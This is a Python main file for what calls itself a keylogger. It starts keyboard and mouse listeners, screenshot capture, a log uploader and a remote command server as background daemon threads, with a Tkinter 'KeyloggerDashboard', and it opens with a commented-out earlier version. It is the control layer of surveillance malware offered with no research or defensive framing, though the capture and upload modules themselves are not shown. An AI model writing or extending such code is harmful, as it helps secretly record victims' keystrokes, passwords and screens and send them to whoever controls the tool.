# import logging
# import yaml
# import threading
# from pathlib import Path
# from core.keyboard_listener import EnhancedKeyboardListener
# from core.mouse_listener import EnhancedMouseListener
# from core.screenshot_capture import ScreenshotManager
# from core.log_uploader import LogUploader
# from core.command_server import CommandServer
# from ui.dashboard import KeyloggerDashboard
# import tkinter as tk
#
#
#
# from core.command_server import start_command_server
# from core.keyboard_listener import start_keylogger
# from core.log_uploader import start_uploader
# from core.mouse_listener import start_mouse_listener
# from core.screenshot_capture import start_screenshot_capture
# from core.system_info import gather_system_info
#
#
#
# def load_config():
#     config_path = Path("config/settings.yaml")
#     with open(config_path) as f:
#         return yaml.safe_load(f)
#
#
# def setup_logging():
#     logging.basicConfig(
#         level=logging.INFO,
#         format='%(asctime)s - %(levelname)s - %(message)s',
#         handlers=[
#             logging.FileHandler('keylogger.log'),
#             logging.StreamHandler()
#         ]
#     )
#
#
# class ApplicationController:
#     def __init__(self, config):
#         self.config = config
#         self.controllers = {
#             'keyboard': EnhancedKeyboardListener(config),
#             'mouse': EnhancedMouseListener(config),
#             'screenshots': ScreenshotManager(config),
#             'uploader': LogUploader(config),
#             'command_server': CommandServer(config)  # Now properly initialized
#         }
#         self.threads = {}
#
#     def start(self):
#         # Start command server first
#         self.controllers['command_server'].start()
#
#         # Start other components
#         for name, controller in self.controllers.items():
#             if name != 'command_server' and hasattr(controller, 'start'):
#                 thread = threading.Thread(target=controller.start)
#                 thread.daemon = True
#                 thread.start()
#                 self.threads[name] = thread
#
#     def stop(self):
#         # Stop command server first
#         self.controllers['command_server'].stop()
#
#         # Stop other components
#         for name, controller in self.controllers.items():
#             if name != 'command_server' and hasattr(controller, 'stop'):
#                 controller.stop()
#         # Wait for threads
#         for thread in self.threads.values():
#             thread.join(timeout=5)
#
#
# def main():
#     # Start all components in separate threads so they can run concurrently
#     threading.Thread(target=start_command_server, daemon=True).start()
#     threading.Thread(target=start_keylogger, daemon=True).start()
#     threading.Thread(target=start_uploader, daemon=True).start()
#     threading.Thread(target=start_mouse_listener, daemon=True).start()
#     threading.Thread(target=start_screenshot_capture, daemon=True).start()
#     threading.Thread(target=gather_system_info, daemon=True).start()
#
#     # Keep the program running to let everything work in the background
#     while True:
#         pass  # Infinite loop to keep the program running
#
#
#     setup_logging()
#     config = load_config()
#
#     app_controller = ApplicationController(config)
#
#     # Start UI
#     root = tk.Tk()
#     dashboard = KeyloggerDashboard(root, config, app_controller.controllers)
#
#     # Start background services
#     app_controller.start()
#
#     try:
#         root.mainloop()
#     except KeyboardInterrupt:
#         logging.info("Shutting down...")
#     finally:
#         app_controller.stop()
#
#
# if __name__ == "__main__":
#     main()
#
#
#
#
#


import logging
import yaml
import threading
from pathlib import Path
from core.keyboard_listener import EnhancedKeyboardListener
from core.mouse_listener import EnhancedMouseListener
from core.screenshot_capture import ScreenshotManager
from core.log_uploader import LogUploader
from core.command_server import CommandServer
from ui.dashboard import KeyloggerDashboard
import tkinter as tk


def load_config():
    config_path = Path("config/settings.yaml")
    with open(config_path) as f:
        return yaml.safe_load(f)


def setup_logging():
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('keylogger.log'),
            logging.StreamHandler()
        ]
    )


class ApplicationController:
    def __init__(self, config):
        self.config = config
        self.controllers = {
            'keyboard': EnhancedKeyboardListener(config),
            'mouse': EnhancedMouseListener(config),
            'screenshots': ScreenshotManager(config),
            'uploader': LogUploader(config),
            'command_server': CommandServer(config)
        }
        self.threads = {}

    def start(self):
        # Start command server first
        self.controllers['command_server'].start()

        # Start other components in background threads
        for name, controller in self.controllers.items():
            if name != 'command_server' and hasattr(controller, 'start'):
                thread = threading.Thread(target=controller.start)
                thread.daemon = True
                thread.start()
                self.threads[name] = thread

    def stop(self):
        # Stop command server first
        self.controllers['command_server'].stop()

        # Stop other components
        for name, controller in self.controllers.items():
            if name != 'command_server' and hasattr(controller, 'stop'):
                controller.stop()

        # Wait for threads to finish
        for thread in self.threads.values():
            thread.join(timeout=5)


def main():
    setup_logging()
    config = load_config()

    app_controller = ApplicationController(config)

    # Start background services
    app_controller.start()

    # Start UI
    root = tk.Tk()
    dashboard = KeyloggerDashboard(root, config, app_controller.controllers)

    try:
        root.mainloop()
    except KeyboardInterrupt:
        logging.info("Shutting down...")
    finally:
        app_controller.stop()


if __name__ == "__main__":
    main()
